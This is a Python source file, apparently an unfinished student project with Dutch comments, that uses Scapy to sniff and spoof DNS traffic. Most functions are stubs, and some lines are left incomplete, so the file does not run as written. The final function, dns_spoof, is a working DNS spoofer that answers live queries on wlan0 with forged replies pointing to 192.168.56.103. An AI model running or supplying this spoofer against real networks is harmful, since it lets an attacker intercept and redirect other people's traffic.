from scapy.all import *
# import scanning as scan
from sys import argv

# DNS spoofing will make use of ARP spoofing in guispoofing.py

"""
def alter_packet(d_pkt):
    #als dit niet werkt zet hier [0] achter
    dstIP = d_pkt.getlayer(IP).dst
    srcIP = d_pkt.getlayer(IP).src
    dstPort =
    srcPort =
    new_pkt = "voeg iets samen"
    return new_pkt
"""

def sniff_DNSpackets():
    # sniff DNS traffic one at a time
    while 1:
        DNSpkt = sniff(count=1, filter="dst port 53", iface=argv[1])
        # if it is a DNS request, call on alter_packet
        if DNSpkt.haslayer(DNSQR):
            # alter_packet(DNSpkt)
            dstIP = DNSpkt.getlayer(IP).dst
            srcIP = DNSpkt.getlayer(IP).src
            # mogelijk checken of het altijd UDP verkeer of ook TCP verkeer is
            dstPort = DNSpkt.getlayer(UDP).dport
            srcPort = DNSpkt.getlayer(UDP).sport





def return_packet():
    Kees = "Kut"

























# testing examples
def dns_spoof(pkt):
    redirect_to = '192.168.56.103'
    if pkt.haslayer(DNSQR): # DNS question record
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
        send(spoofed_pkt)
        print 'Sent:', spoofed_pkt.summary()
    sniff(filter='udp port 53', iface='wlan0', store=0, prn=dns_spoof)